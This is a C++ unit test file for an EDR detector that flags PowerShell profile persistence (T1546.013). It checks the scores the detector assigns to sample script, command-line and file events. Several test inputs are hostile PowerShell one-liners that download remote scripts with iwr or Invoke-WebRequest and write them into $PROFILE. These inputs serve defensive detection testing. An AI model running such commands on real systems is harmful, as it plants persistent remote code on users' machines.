/*
 * ps_profile_detector_tests.cpp - Unit tests for PsProfileDetector
 * (T1546.013 PowerShell Profile).
 */
#include "ps_profile_detector_tests.h"

#include <cstdint>
#include <cstdio>
#include <stdexcept>
#include <string>

#include "edr_event.h"
#include "event_bus.h"
#include "ps_profile_detector.h"

namespace {

#define PP_CHECK(condition) Check((condition), #condition, __LINE__)

void Check(bool condition, const char* expression, int line) {
    if (!condition)
        throw std::runtime_error(
            "ps profile detector test failed at line " +
            std::to_string(line) + ": " + expression);
}

edr::Event ProcEvent(uint64_t ts100ns, const char* image,
                     const char* commandLine) {
    edr::Event event;
    event.type = EDR_EVT_PROCESS_START;
    event.ts100ns = ts100ns;
    event.fields[edr::field::kType] = "PROCESS_START";
    event.fields[edr::field::kImage] = image;
    if (commandLine != nullptr)
        event.fields[edr::field::kCommandLine] = commandLine;
    return event;
}

edr::Event ScriptEvent(uint64_t ts100ns, const char* scriptText) {
    edr::Event event;
    event.type = EDR_EVT_POWERSHELL_SCRIPT;
    event.ts100ns = ts100ns;
    event.fields[edr::field::kType] = "PS_SCRIPT";
    /* House contract: the PS script body lives ONLY in kScriptBlockText,
     * never kCommandLine. */
    event.fields[edr::field::kScriptBlockText] = scriptText;
    return event;
}

edr::Event FileEvent(uint16_t type, uint64_t ts100ns, const char* path) {
    edr::Event event;
    event.type = type;
    event.ts100ns = ts100ns;
    event.fields[edr::field::kType] =
        type == EDR_EVT_FILE_CREATE ? "FILE_CREATE" : "FILE_RENAME";
    event.fields[edr::field::kFilePath] = path;
    return event;
}

std::string Score(const edr::Event& event) {
    auto it = event.fields.find(edr::field::kPsProfileScore);
    return it == event.fields.end() ? "" : it->second;
}

std::string Verdict(const edr::Event& event) {
    auto it = event.fields.find(edr::field::kPsProfileVerdict);
    return it == event.fields.end() ? "" : it->second;
}

constexpr uint64_t kSecond = 10000000ULL;

} // namespace

void RunPsProfileDetectorTests() {
    std::fprintf(stderr, "[ps-profile] TestDisabled\n");
    {
        edr::PsProfileDetector detector(false, 55, 300, 64);
        edr::Event event = ScriptEvent(1000,
            "Set-Content $PROFILE -Value (iwr http://x/a.ps1)");
        detector.Enrich(event);
        PP_CHECK(Score(event).empty());
    }

    std::fprintf(stderr, "[ps-profile] TestPayloadStagedIntoProfile\n");
    {
        edr::PsProfileDetector detector(true, 55, 300, 64);
        edr::Event event = ScriptEvent(1000,
            "Set-Content $PROFILE -Value (iwr http://x/a.ps1)");
        detector.Enrich(event);
        PP_CHECK(Score(event) == "95");
        PP_CHECK(Verdict(event) == "malicious");
    }

    std::fprintf(stderr, "[ps-profile] TestCurrentUserProfileWrite\n");
    {
        edr::PsProfileDetector detector(true, 55, 300, 64);
        edr::Event event = ScriptEvent(1000,
            "Add-Content $PROFILE 'Start-SilverFox'");
        detector.Enrich(event);
        PP_CHECK(Score(event) == "85");
        PP_CHECK(Verdict(event) == "malicious");
    }

    std::fprintf(stderr, "[ps-profile] TestRedirectIntoProfile\n");
    {
        edr::PsProfileDetector detector(true, 55, 300, 64);
        edr::Event event = ScriptEvent(1000,
            "Invoke-WebRequest http://x/p.ps1 -OutFile $PROFILE");
        detector.Enrich(event);
        PP_CHECK(Score(event) == "95");
    }
    {
        edr::PsProfileDetector detector(true, 55, 300, 64);
        edr::Event event = ScriptEvent(1000,
            "echo 'payload' >> $profile");
        detector.Enrich(event);
        PP_CHECK(Score(event) == "85");
    }

    std::fprintf(stderr, "[ps-profile] TestAllUsersWrite\n");
    {
        edr::PsProfileDetector detector(true, 55, 300, 64);
        edr::Event event = ScriptEvent(1000,
            "New-Item -Path $PSHOME\\profile.ps1 -ItemType File");
        detector.Enrich(event);
        PP_CHECK(Score(event) == "90");
    }

    std::fprintf(stderr, "[ps-profile] TestCommandLineSurface\n");
    {
        edr::PsProfileDetector detector(true, 55, 300, 64);
        edr::Event event = ProcEvent(1000, "C:\\Windows\\System32\\cmd.exe",
            "powershell -c Set-Content $PROFILE -Value (iex (gc script.txt))");
        detector.Enrich(event);
        PP_CHECK(Score(event) == "95");
    }

    std::fprintf(stderr, "[ps-profile] TestProfileReferencedWithPayload\n");
    {
        edr::PsProfileDetector detector(true, 55, 300, 64);
        edr::Event event = ScriptEvent(1000, "iex (gc $PROFILE)");
        detector.Enrich(event);
        PP_CHECK(Score(event) == "60");
        PP_CHECK(Verdict(event) == "suspicious");
    }

    std::fprintf(stderr, "[ps-profile] TestReadOnlyReferencesSilent\n");
    {
        edr::PsProfileDetector detector(true, 55, 300, 64);
        const char* kSilent[] = {
            "Get-Content $PROFILE",
            "Test-Path $PROFILE",
            ". $PROFILE",
            "& $PROFILE",
            "notepad $PROFILE",
            "ise $PROFILE",
            "about_Profiles help topic",
        };
        for (const char* text : kSilent) {
            edr::Event event = ScriptEvent(1000, text);
            detector.Enrich(event);
            if (!Score(event).empty()) {
                std::fprintf(stderr, "unexpected hit for '%s'\n", text);
                PP_CHECK(false);
            }
        }
    }

    std::fprintf(stderr, "[ps-profile] TestFileSurface\n");
    {
        edr::PsProfileDetector detector(true, 55, 300, 64);
        edr::Event user = FileEvent(EDR_EVT_FILE_CREATE, 1000,
            "C:\\Users\\a\\Documents\\WindowsPowerShell\\profile.ps1");
        detector.Enrich(user);
        PP_CHECK(Score(user) == "85");
        PP_CHECK(Verdict(user) == "malicious");

        edr::Event allUsers = FileEvent(EDR_EVT_FILE_CREATE, 1000,
            "C:\\Program Files\\PowerShell\\7\\profile.ps1");
        detector.Enrich(allUsers);
        PP_CHECK(Score(allUsers) == "90");

        edr::Event staged = FileEvent(EDR_EVT_FILE_CREATE, 1000,
            "C:\\Users\\a\\AppData\\Local\\Temp\\profile.ps1");
        detector.Enrich(staged);
        PP_CHECK(Score(staged) == "75");

        edr::Event renamed = FileEvent(EDR_EVT_FILE_RENAME, 1000,
            "C:\\Users\\a\\Documents\\WindowsPowerShell\\"
            "Microsoft.VSCode_profile.ps1");
        detector.Enrich(renamed);
        PP_CHECK(Score(renamed) == "85");
    }

    std::fprintf(stderr, "[ps-profile] TestFileSurfaceNonProfileSilent\n");
    {
        edr::PsProfileDetector detector(true, 55, 300, 64);
        const char* kSilent[] = {
            "C:\\Users\\a\\Documents\\WindowsPowerShell\\Modules\\m.psm1",
            "C:\\temp\\readme.ps1",
            "C:\\temp\\notes.txt",
            "C:\\Users\\a\\profile.ps1.bak",
        };
        for (const char* path : kSilent) {
            edr::Event event = FileEvent(EDR_EVT_FILE_CREATE, 1000, path);
            detector.Enrich(event);
            if (!Score(event).empty()) {
                std::fprintf(stderr, "unexpected hit for '%s'\n", path);
                PP_CHECK(false);
            }
        }
    }

    std::fprintf(stderr, "[ps-profile] TestVariableBoundary\n");
    {
        edr::PsProfileDetector detector(true, 55, 300, 64);
        /* $profileFoo is a different variable and must not trigger. */
        edr::Event event = ScriptEvent(1000,
            "Set-Content $profileFoo 'x'");
        detector.Enrich(event);
        PP_CHECK(Score(event).empty());
    }

    std::fprintf(stderr, "[ps-profile] TestDedupWindow\n");
    {
        edr::PsProfileDetector detector(true, 55, 300, 64);
        edr::Event first = ScriptEvent(1000, "Add-Content $PROFILE 'x'");
        detector.Enrich(first);
        PP_CHECK(Score(first) == "85");
        edr::Event second = ScriptEvent(2 * kSecond,
            "Add-Content $PROFILE 'x'");
        detector.Enrich(second);
        PP_CHECK(Score(second).empty());
        edr::Event third = ScriptEvent(400 * kSecond,
            "Add-Content $PROFILE 'x'");
        detector.Enrich(third);
        PP_CHECK(Score(third) == "85");
    }

    std::fprintf(stderr, "[ps-profile] TestMinScoreBoundary\n");
    {
        /* 60-band finding must stay silent under a malicious-only
         * threshold (min_score=75) on a separate instance. */
        edr::PsProfileDetector detector(true, 75, 300, 64);
        edr::Event event = ScriptEvent(1000, "iex (gc $PROFILE)");
        detector.Enrich(event);
        PP_CHECK(Score(event).empty());
    }

    std::fprintf(stderr, "[ps-profile] TestStateCapacityReset\n");
    {
        edr::PsProfileDetector detector(true, 55, 0, 1);
        edr::Event first = ScriptEvent(1000, "Add-Content $PROFILE 'a'");
        detector.Enrich(first);
        PP_CHECK(Score(first) == "85");
        edr::Event second = ScriptEvent(2 * kSecond,
            "Add-Content $PROFILE 'b'");
        detector.Enrich(second);
        PP_CHECK(Score(second) == "85");
    }

    std::fprintf(stderr, "[ps-profile] all passed\n");
}
